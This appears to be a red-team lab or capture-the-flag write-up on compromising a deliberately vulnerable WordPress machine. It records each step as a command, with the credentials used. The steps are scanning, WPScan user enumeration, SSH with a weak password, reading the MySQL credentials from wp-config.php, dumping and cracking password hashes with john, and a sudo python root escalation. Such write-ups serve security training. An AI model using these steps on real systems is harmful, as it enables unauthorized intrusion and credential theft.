# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Netdiscover results identify the IP addresses of Targets on the network:

```bash
  # netdiscover -r 192.168.1.90
```

![nmap output](Images/netdiscover.png)

Nmap scan results for each machine reveal the below services and OS details:

```bash
  # nmap -sV 192.168.1.110
```

![nmap output](Images/nmap.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/tcp: SSH
  - Port 80/tcp: HTTP
  - Port 111/tcp: RPCbind
  - Port 139/tcp: netbios-ssn
  - Port 445/tcp: netbios-ssn

The following vulnerabilities were identified on each target:
- Target 1
  - User Enumeration (WordPress site)
  - Weak User Password
  - Unsalted User Password Hash (WordPress database)
  - Misconfiguration of User Privileges/Privilege Escalation

---

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

#### Flag 1

  - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
    - **Exploit Used**:
      - Enumerated WordPress site Users with WPScan to obtain username `michael`, used SSH to get user shell.
    - **Command**: `wpscan --url 192.168.1.110/wordpress --enumerate u`

```bash
  # wpscan --url 192.168.1.110/wordpress --enumerate u
```

![wpscan output](Images/wpscan1.png)
![wpscan output](Images/wpscan2.png)

  - Used SSH to gain a user shell.
    - **Command**: `ssh michael@192.168.1.110`
    - **Password**: `michael`

```bash
  # ssh michael@192.168.1.110
```

![ssh output](Images/ssh1.png)

  - Searched directories for for service.html to find Flag 1.
    - **Command**: `cat var/www/html/service.html`

```bash
  # cat var/www/html/service.html
```

  - Screenshot of Flag 1:

![flag 1](Images/flag1.png)

---

#### Flag 2

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - Enumerated WordPress site Users with WPScan to obtain username `michael`, used SSH to get user shell.
    - **Command**: `cat var/www/flag2.txt`

```bash
  # cat var/www/flag2.txt
```

  - Screenshot of Flag 2:

![flag 2](Images/flag2.png)

---

#### Flag 3

  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - Continued using user shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.

  - Finding the MySQL database password:
    - **Command**: `cd /var/www/html/wordpress/`
    - **Command**: `nano wp-config.php`

```bash
  # nano wp-config.php
```

![MySQL DB password](Images/MySQL.png)

  - Used the credentials to log into MySQL and dump WordPress user password hashes.
    - **DB_NAME**:	`wordpress`
    - **DB_USER**:	`root`
    - **DB_PASSWORD**:	`R@v3nSecurity`
    - **Command**: `mysql -u root -pR@v3nSecurity -D wordpress`

```bash
  # mysql -u root -pR@v3nSecurity -D wordpress
```

![MySQL DB Login](Images/MySQL_login.png)

  - Searched MySQL database for Flag 3 and WordPress user password hashes.
    - Flag 3 found in `wp_posts`.
    - Password hashes found in `wp_users`.
    - **Command**: `show tables;`
    - **Command**: `select * from wp_posts;`
    - **Command**: `select * from wp_users;`

  - Screenshot of Flag 3:

![flag 3](Images/flag3.png)

  - Screenshot of WordPress user password hashes:

![password hashes](Images/pwdhashes.png)

---

#### Flag 4

  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Used john to crack the password hash obtained from MySQL database, secured new user shell as Steven, escalated to root.

  - Cracking the password hash with john.
    - Copied password hash from MySQL into `~/Desktop/hash.txt` and cracked with john to discover Steven’s password is `pink84`.
    - **Command**: `cd ~/Desktop`
    - **Command**: `john hash.txt`

![john output](Images/john.png)

  - Secure a user shell as the user whose password you cracked.
    - **Command**: `ssh steven@192.168.1.110`
    - **Password**: `pink84`

![ssh output](Images/ssh2.png)

  - Escalating to root:
    - **Command**: `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`

```bash
  # sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
```

  - Searched root directory for Flag 4.
    - **Command**: `cd /root/`
    - **Command**: `ls`
    - **Command**: `cat flag4.txt`

  - Screenshot of Flag 4:

![ssh output](Images/flag4.png)